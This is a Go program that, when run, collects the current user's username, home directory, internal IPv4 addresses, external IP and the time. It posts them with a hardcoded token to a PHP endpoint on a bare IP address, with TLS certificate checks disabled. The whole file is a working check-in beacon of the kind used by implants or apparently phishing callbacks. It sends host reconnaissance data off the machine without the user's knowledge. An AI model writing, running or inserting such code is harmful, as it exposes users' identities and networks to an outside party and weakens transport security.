package main

import (
    "fmt"
    "bytes"
    "net"
    "os"
    "os/user"
    "time"
    "net/http"
    "crypto/tls"
    "io/ioutil"
    "net/url"
)

func extIP() (string, error) {
    rsp, err := http.Get("http://checkip.amazonaws.com")
    if err != nil {
        return "", err
    }
    defer rsp.Body.Close()
    buf, err := ioutil.ReadAll(rsp.Body)
    if err != nil {  
        return "", err
    }
    return string(bytes.TrimSpace(buf)), nil
}

func main() {
    var utoken string = "383d91e5c4b50d829e63b3644445cf9499c70d4b9a24299c4c28e66f10462426"
//    var home string = os.Getenv("USERPROFILE")
    tusr, err := user.Current()
    var ips bytes.Buffer
    addrs, err := net.InterfaceAddrs()
        if err != nil {
            os.Exit(1)
        }

        for _, a := range addrs {
            if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
                if ipnet.IP.To4() != nil {
                    ips.WriteString(ipnet.IP.String() + ",")
                }
            }
        }
  var time string = time.Now().String()
   
  exip, err := extIP()
  
  if err != nil {
    return
  }

  tr := &http.Transport{  //Prevents https from failing with unsigned cert
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        }
  client := &http.Client{Transport: tr}

  resp, err := client.PostForm("https://54.70.255.52/enter.php",
      url.Values{"utoken": {utoken}, "home": {tusr.HomeDir}, "usr": {tusr.Username}, "ips": {ips.String()}, "exip": {exip}, "utime": {time}})

  if nil != err {
    return
  }

  defer resp.Body.Close()
  body, err := ioutil.ReadAll(resp.Body)

  if nil != err {
    return
  }

  fmt.Println(string(body[:]))
}
